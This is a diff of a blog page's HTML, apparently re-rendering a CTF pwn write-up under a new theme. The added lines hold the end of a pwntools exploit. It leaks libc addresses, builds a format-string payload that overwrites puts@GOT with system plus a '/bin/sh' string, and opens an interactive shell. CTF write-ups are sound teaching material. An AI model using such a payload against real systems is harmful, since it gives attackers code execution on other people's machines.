+data1 = io.recv(14)
+io.recvuntil(&quot;, &quot;)
+data2 = io.recv(14)
+io.recvuntil(&quot;, &quot;)
+data3 = io.recv(14)
+io.recvuntil(&quot;, &quot;)
+data4 = io.recv(8)
+success(&quot;data1 -&gt; %s&quot; % data1)
+success(&quot;data2 -&gt; %s&quot; % data2)
+success(&quot;data3 -&gt; %s&quot; % data3)
+success(&quot;data4 -&gt; %s&quot; % data4)
+# pause()
 
-            </section>
-        
-        <section class="post-tags">
-            <div>
-                <span>Tag(s):</span>
-                <span class="tag">
-                    
-                    
-                        <a href="/tags/write-up/"># write-up</a>
-                    
-                        <a href="/tags/pwn/"># pwn</a>
-                    
-                        
-                </span>
-            </div>
-            <div>
-                <a href="javascript:window.history.back();">back</a>
-                <span>· </span>
-                <a href="/">home</a>
-            </div>
-        </section>
-        <section class="post-nav">
-            
-                <a class="prev" rel="prev" href="/2022/07/26/DASCTF2022%E4%B8%83%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9B-eyfor/">DASCTF2022七月赋能赛 eyfor</a>
-            
-            
-            <a class="next" rel="next" href="/2022/06/22/For-Final-Exam-JavaScript%EF%BC%9Aweb%E5%89%8D%E7%AB%AF%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">(For Final Exam)JavaScript：web前端部分知识总结</a>
-            
-        </section>
+puts_addr = int(data1 , 16)
+# libc = LibcSearcher(&#39;puts&#39; , puts_addr)
 
+libc_base = int(data2 , 16) - libc.sym[&#39;printf&#39;]
+# libc_base = libc.dump(&quot;puts&quot;) - puts_addr
+success(&quot;leak libc base -&gt; %s&quot; % hex(libc_base))
 
-    </article>
-</div>
+system = libc_base + libc.sym[&#39;system&#39;]
+# system = libc_base + libc.dump(&quot;system&quot;)
+io.recvuntil(&quot;it?\n&quot;)
+payload = fmtstr_payload(8 , &#123;elf.got[&#39;puts&#39;]:system,0x600c80:b&#39;/bin/sh\x00&#39;&#125;)
+io.sendline(payload)
 
-            </div>
-            <footer id="footer" class="footer">
-    <div class="copyright">
-        <span>© Mykonos | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
-    </div>
-</footer>
-
-    </div>
-</body>
-
-</html>
+io.interactive()
+</code></pre>
+<div id="paginator"></div></div><div id="post-footer"><div id="pages"><div class="footer-link" style="width: 50%;text-align:right;border-right:1px #fe2 solid"><a href="/2022/07/26/DASCTF2022%E4%B8%83%E6%9C%88%E8%B5%8B%E8%83%BD%E8%B5%9B-eyfor/">← 下一篇 DASCTF2022七月赋能赛 eyfor</a></div><div class="footer-link" style="width: 50%;right:1px;border-left:1px #fe2 solid"><a href="/2022/06/22/For-Final-Exam-JavaScript%EF%BC%9Aweb%E5%89%8D%E7%AB%AF%E9%83%A8%E5%88%86%E7%9F%A5%E8%AF%86%E6%80%BB%E7%BB%93/">(For Final Exam)JavaScript：web前端部分知识总结 上一篇 →</a></div></div></div></div><div class="bottom-btn"><div><a class="i-top" id="to-top" onClick="scrolls.scrolltop();" title="回到顶部" style="opacity: 0; display: none;">∧ </a><a class="i-index" id="to-index" href="#toc-div" title="文章目录">≡</a><a class="i-color" id="color-mode" onClick="colorMode.change()" title="切换主题"></a></div></div></article><aside><div id="about"><a href="/" id="logo"><img src="https://ak.hypergryph.com/assets/index/images/ak/pc/faction/1.png" alt="Logo"></a><h1 id="Dr"><a href="/">Mykonos</a></h1><div id="description"><p></p></div><div id="social-links"><a class="social" target="_blank" rel="noopener" href="https://github.com/Mykonos-x"><i class="fab fa-github" alt="Github"></i></a><a class="social" href="g0dzirrazhou@gmail.com"><i class="fa fa-envelope" alt="E-Mail"></i></a></div></div><div id="aside-block"><div id="toc-div"><h1>目录</h1><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#checksec"><span class="toc-number">1.</span> <span class="toc-text">checksec</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#main"><span class="toc-number">2.</span> <span class="toc-text">main</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Analyze"><span class="toc-number">3.</span> <span class="toc-text">Analyze</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol></div></div><footer><nobr>构建自 <a target="_blank" rel="noopener" href="http://hexo.io">Hexo</a></nobr><wbr><nobr> 使用主题 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus/hexo-theme-arknights">Arknights</a></nobr><wbr><nobr> 主题作者 <a target="_blank" rel="noopener" href="https://github.com/Yue-plus">Yue_plus</a></nobr></footer></aside></main><canvas id="canvas-dust"></canvas><script src="/js/search.js"></script><script src="/js/arknights.js"></script><script src="//unpkg.com/lightgallery@2.7.1/lightgallery.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/zoom/lg-zoom.min.js"></script><script src="//unpkg.com/lightgallery@2.7.1/plugins/thumbnail/lg-thumbnail.min.js"></script><script src="/js/pjax.js"></script><script class="pjax-js">reset= () => {document.querySelector('.lg-container')?.remove()
+lightGallery(document.getElementById('post-bg'), {
+  plugins: [lgZoom,lgThumbnail],
+  selector: '.item-img'})}</script><script>window.addEventListener("load",() => {pjax = new Pjax({
+ cacheBust: false,
+ selectors: ['title','article','#aside-block','.pjax-js'],
+ switches: {'article': Pjax.switches.sideBySide},
+ switchesOptions: {
+   'article': {
+     classNames: {
+       remove: "pjax-out",
+       add: "pjax-in"
+     }
+   }
+ }
+});
+document.addEventListener("pjax:complete", reset);reset()})</script></body></html>
